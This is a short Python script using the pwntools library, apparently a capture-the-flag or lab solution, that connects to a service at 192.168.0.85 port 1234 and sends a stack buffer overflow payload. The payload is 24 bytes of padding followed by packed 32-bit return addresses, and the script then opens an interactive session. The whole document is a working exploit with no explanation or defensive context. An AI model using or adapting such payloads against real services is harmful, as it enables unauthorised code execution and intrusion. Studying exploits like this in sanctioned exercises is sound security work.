from pwn import *

s = remote('192.168.0.85',1234)
raw_input()
s.recvuntil('attack:')
dat = 'A'*24
dat += p32(0x08048296)*2
dat += p32(0x80483E3)

s.send(dat)
s.interactive()
